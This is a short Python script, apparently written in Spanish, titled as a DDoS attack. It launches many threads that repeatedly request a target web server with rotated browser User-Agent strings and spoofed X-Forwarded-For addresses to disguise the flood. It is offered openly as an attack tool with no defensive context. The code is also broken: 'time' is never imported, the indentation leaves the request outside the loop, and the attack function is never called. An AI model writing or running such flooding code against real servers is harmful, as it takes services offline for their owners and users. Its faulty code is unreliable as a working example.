import threading
import requests
import random

URL = "https://mi-servidor-web.com"

USER_AGENTS = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
]

IP_ADDRESSES = [
"192.168.1.1",
"192.168.1.2",
"192.168.1.3",
"192.168.1.4",
"192.168.1.5",
]

def ddos_attack():
    while True:
        headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": random.choice(IP_ADDRESSES),
    }
    try:
        requests.get(URL, headers=headers)
        time.sleep(random.uniform(0, 1))
    except:
        pass

    for i in range(100):
        thread = threading.Thread(target=ddos_attack)
        thread.start()